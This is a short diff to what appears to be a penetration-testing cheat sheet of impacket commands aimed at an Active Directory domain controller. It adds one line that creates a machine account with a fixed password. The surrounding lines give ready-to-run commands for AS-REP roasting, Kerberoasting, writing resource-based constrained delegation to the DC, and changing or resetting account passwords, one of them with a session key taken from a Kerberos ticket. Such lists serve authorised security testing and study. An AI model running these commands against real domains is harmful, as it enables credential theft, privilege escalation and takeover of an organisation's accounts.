@@ -543,6 +543,7 @@ impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile use
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 impacket-rbcd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -delegate-from '$USERNAME' -delegate-to 'DC$' -action 'write'
 impacket-findDelegation -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
+impacket-addcomputer -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -computer-name supercomputer -computer-pass '123qweasdF!'
 impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '123qweasdF!'
 impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '123qweasdF!' -p kpasswd -reset
 impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newhashes :$(impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs)
